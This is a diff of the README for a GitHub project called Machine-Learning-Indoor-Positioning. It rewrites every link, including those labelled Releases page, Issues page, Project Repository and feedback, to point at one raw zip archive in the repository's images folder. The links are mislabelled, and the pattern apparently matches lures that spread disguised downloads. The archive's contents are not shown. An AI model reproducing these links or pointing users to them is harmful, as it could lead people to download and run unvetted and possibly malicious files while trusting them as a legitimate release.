@@ -1,6 +1,6 @@
 # 🤖 Machine-Learning-Indoor-Positioning - Locate Yourself Indoors with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
+[![Download](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip)
 
 ## 📜 Description
 
@@ -10,7 +10,7 @@ Machine-Learning-Indoor-Positioning is a tool that helps you find your location 
 
 Follow these steps to get started with the application:
 
-1. **Visit the Release Page:** Go to our [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases). 
+1. **Visit the Release Page:** Go to our [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip). 
 2. **Download the Application:** Find the latest version and download the appropriate file for your device. 
 
 ## 🖥️ System Requirements
@@ -25,7 +25,7 @@ To run this application, make sure your device meets the following requirements:
 ## 🔧 How to Install
 
 1. **Download the Application:** 
-   - On the [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases), click on the latest version. 
+   - On the [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip), click on the latest version. 
    - Choose the file suitable for your operating system and click the download button.
 
 2. **Locate the Downloaded File:**
@@ -68,7 +68,7 @@ If you encounter any issues:
 
 ## 📞 Support
 
-For support, please open an issue on the [GitHub Issues page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/issues). We strive to respond within 48 hours.
+For support, please open an issue on the [GitHub Issues page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip). We strive to respond within 48 hours.
 
 ## 🙏 Acknowledgments
 
@@ -76,13 +76,13 @@ Thanks to all contributors for their hard work in making this project possible. 
 
 ## 💡 Feedback
 
-We welcome feedback to improve the application. If you have suggestions or comments, please reach out via our [GitHub page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning) or leave your feedback on the Issues page.
+We welcome feedback to improve the application. If you have suggestions or comments, please reach out via our [GitHub page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip) or leave your feedback on the Issues page.
 
 ## 📢 Important Links
 
-- [Project Repository](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning)
-- [Releases Page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
+- [Project Repository](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip)
+- [Releases Page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip)
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
+[![Download](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/raw/refs/heads/main/images/Learning-Machine-Indoor-Positioning-1.2-beta.3.zip)
 
 Enjoy using Machine-Learning-Indoor-Positioning to discover your indoor surroundings.
